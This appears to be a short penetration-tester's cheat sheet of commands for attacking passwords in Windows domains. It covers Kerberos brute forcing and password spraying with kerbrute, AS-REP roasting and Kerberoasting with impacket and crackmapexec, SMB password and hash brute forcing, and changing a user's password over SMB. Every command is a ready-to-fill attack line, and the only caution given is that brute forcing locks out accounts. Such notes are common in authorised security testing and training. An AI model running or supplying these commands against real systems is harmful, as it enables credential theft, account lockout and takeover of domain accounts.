# Passwords
## Kerberos
Brute force - WILL LOCKOUT USER:
`kerbrute bruteuser --dc <IP> -d <DOMAIN> <PASSLIST> <USER>`

Check password for userlist:
`kerbrute passwordspray --dc <IP> -d <DOMAIN> -v <USERLIST> <PASS>`

AS-REP (AS-REP Roasting):
`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/ -usersfile <USERLIST>` 
`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` (creds)
`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --asreproast <OUTPUT>` (creds)

TGS-REP (Kerberoasting):
`impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` (creds)
`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --kerberoasting <OUTPUT>` (creds)

## NetBIOS & SMB
Brute force passwords - WILL LOCKOUT USER:
`crackmapexec smb <IP> -u <USER> -p <PASSLIST>`
`crackmapexec smb <IP> -u <USER> -H <HASHES>`

Check password for users in list:
`crackmapexec smb <IP> -u <USERLIST> -p <PASS>`

Change password user:
`smbpasswd -U <USER> -r <DC_IP>`